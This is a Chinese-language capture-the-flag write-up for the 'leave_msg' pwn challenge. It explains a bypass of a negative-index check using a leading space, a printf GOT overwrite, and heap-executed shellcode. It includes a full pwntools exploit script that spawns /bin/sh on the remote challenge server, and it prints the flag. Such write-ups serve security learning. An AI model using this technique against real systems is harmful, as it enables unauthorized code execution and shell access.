# PHM #72 Pwn — leave_msg

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 200 |
| 連線 | `nc ctf.hackme.quest 7715` |
| 檔案 | [`/static/leave_msg`](https://ctf.hackme.quest/static/leave_msg) (ELF 32-bit, stripped) |
| 保護 | No PIE, canary **on**, Partial RELRO, **GNU_STACK = RWE (堆疊/堆積可執行)** |

## 分析

`main` @ `0x80485cb` 跑 **3 輪** (counter @ `0x804a04c`, `cmp ...,2; jle`):

1. `puts("...leave your message:")` → `read(0, buf1[ebp-0x40c], 0x400)` 讀訊息。
2. `puts("Which message slot?")` → `read(0, buf2[ebp-0x41c], 0x10)` → `idx = atoi(buf2)`。
3. `strlen(buf1) > 8` → 印「too long」並把 `buf1[8]=0` **截斷到 8 bytes**。
4. 索引檢查: `if (idx > 0x40) bad; else if (buf2[0]=='-') bad; else 存`。
5. 存: `*(0x804a060 + idx*4) = strdup(buf1)` — 把「指向 ≤8 bytes 訊息的 heap 指標」寫進表格。

結束後: `for i in 0..0x3f: if table[i]: printf("%d: %s\n", i, table[i])` → `puts("Goodbye")`。

### 漏洞: 有號數索引 + '-' 檢查可繞 → 任意寫

索引檢查只看 `buf2[0]=='-'` 擋負號, 但 `atoi` **會跳過前導空白**。送 `" -19"` → `atoi=-19`、`buf2[0]==' '≠'-'`、`-19 > 0x40` 為 false → 通過 → **以負索引寫到表格之外** = 任意位址寫入一個 heap 指標。

目標 `0x804a060 + (-19)*4 = 0x804a014 = printf@got`。`printf` **只在最後列印迴圈**被呼叫 (3 輪輸入期間用的是 puts/read/atoi/strlen/strdup, 不碰 printf), 所以覆寫它不會提早觸發。

### 關鍵: printf 當下的堆疊 → 直接拿 "/bin/sh"

`printf("%d: %s", i, table[i])` 進入時堆疊: `[esp]=ret, [esp+4]=fmt, [esp+8]=i, [esp+0xc]=table[i]`。把 `"/bin/sh"` 存在 `table[0]`, 第一個被列印的就是它, 於是進到被劫持的 printf 時 **`[esp+0xc]` 正好是 `"/bin/sh"` 的指標** → shellcode 直接 `execve([esp+0xc],0,0)`, 不用自己 push 字串。

堆疊/堆積 RWE → heap 上的 shellcode 可執行 (伺服器舊 kernel; 現代 kernel 本機測會 SIGSEGV)。

## 解法

訊息 ≤8 bytes, 用 3 個 chunk: 2 塊放 14-byte shellcode (靠 `eb 08` 跳過 chunk header 串接, 間距 0x10), 1 塊放 `/bin/sh`。

```python
from pwn import *
context(arch='i386', os='linux')
c1 = b"\x8b\x5c\x24\x0c\x31\xc9\xeb\x08"   # mov ebx,[esp+0xc]; xor ecx,ecx; jmp +8 -> C1+0x10
c2 = b"\x31\xd2\x6a\x0b\x58\xcd\x80"       # xor edx,edx; push 0xb; pop eax; int 0x80
io = remote('ctf.hackme.quest', 7715)
def one(msg, idx):
    io.recvuntil(b"message:"); io.send(msg + b"\x00")
    io.recvuntil(b"slot?");     io.send(idx + b"\n")
one(c1, b" -19")   # printf@got = &c1   (負索引繞檢查)
one(c2, b"2")      # table[2] = &c2 ;  heap 順序 => C2 = C1+0x10 (eb08 跳到這)
one(path := b"/bin/sh", b"0")   # table[0]="/bin/sh" -> 觸發 printf 且在 [esp+0xc]
io.sendline(b"cat flag"); print(io.recvall(timeout=5))
```

## Flag

```
FLAG{0key, I s4w 7he me55age y0u 1eaved. But I 4m 0n th3 vacat10n.}
```

## 感想

重點三連: (1) `atoi` 吃前導空白 → 用 `" -19"` 繞掉只看 `buf2[0]` 的負號檢查, 把「heap 指標任意寫」導到 `printf@got`; (2) 挑一個**事後才呼叫**的 GOT (printf 只在收尾迴圈) 避免提早觸發; (3) 借 `printf` 當下 `[esp+0xc]` 就是 `table[0]` 的特性, 把 `/bin/sh` 擺那裡, shellcode 只要 14 bytes。沒有 leak、沒有 system, 全靠 RWE heap 跑 shellcode。
